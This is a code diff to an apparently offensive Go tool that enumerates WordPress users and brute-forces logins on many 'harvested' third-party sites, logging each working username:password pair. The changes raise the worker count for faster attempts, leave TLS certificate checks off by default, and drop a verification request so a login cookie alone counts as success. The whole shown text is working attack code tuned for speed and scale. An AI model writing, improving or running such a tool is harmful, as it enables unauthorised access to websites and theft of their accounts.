@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"crypto/tls"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -57,6 +58,8 @@ var (
 	installFlag  = flag.Bool("install", false, "Install as systemd service and exit")
 	diagEnabled  = flag.Bool("diag", true, "Write the diagnostic log (buffered)")
 	diagFile     = flag.String("diag-file", "", "Diagnostic log path (empty = <app dir>/debug.log)")
+	verifyTLS    = flag.Bool("verify-tls", false, "Verify TLS certificates (default off: many targets have broken chains)")
+	prepWorkersF = flag.Int("prep-workers", 0, "Pre-flight workers (0 = auto from CPU)")
 )
 
 var logOutput *os.File
@@ -491,10 +494,13 @@ func main() {
 	// Pipelined site preparer: pre-checks sites and enumerates users in parallel
 	// so slow, dead, or protected sites never stall the scheduler loop.
 	// Aggressive: use many prep workers to feed the job queue fast
-	prepWorkers := min(max(runtime.NumCPU()*8, 32), 128)
+	prepWorkers := *prepWorkersF
+	if prepWorkers <= 0 {
+		prepWorkers = min(max(runtime.NumCPU()*24, 64), 256)
+	}
 	// A prepared job owns its whole candidate slice, so this buffer is the
-	// real memory reservoir; keep it shallow.
-	jobCh := make(chan *SiteJob, 128)
+	// real memory reservoir; keep it near the prep fan-out rather than huge.
+	jobCh := make(chan *SiteJob, max(min(prepWorkers*2, 256), 64))
 	var prepWg sync.WaitGroup
 	for i := 0; i < prepWorkers; i++ {
 		prepWg.Add(1)
@@ -1153,11 +1159,8 @@ func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
 		strings.Contains(location, "wp-admin") && !strings.Contains(location, "wp-login")
 
 	if hasAuthCookie(resp) {
-		if adminRedirect {
-			verifyAdmin(j.Site, location, resp)
-		} else {
-			verifyAdmin(j.Site, strings.TrimRight(j.Site, "/")+"/wp-admin/", resp)
-		}
+		// The cookie is authoritative; WordPress only sets it after a real
+		// authentication. No verification GET is needed.
 		diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - wordpress_logged_in cookie", user, pass))
 		return outSuccess, ""
 	}
@@ -2558,6 +2561,14 @@ func newHTTPClient() *fasthttp.Client {
 		NoDefaultUserAgentHeader:      true,
 		DisableHeaderNamesNormalizing: true,
 		Dial:                          cachedDial,
+		// A shared ticket cache makes reconnects to the same host resume
+		// instead of doing a full handshake, which is otherwise the largest
+		// CPU cost per attempt. Verification is off by default because broken
+		// certificate chains are common on harvested targets.
+		TLSConfig: &tls.Config{
+			InsecureSkipVerify: !*verifyTLS,
+			ClientSessionCache: tls.NewLRUClientSessionCache(4096),
+		},
 	}
 	return c
 }
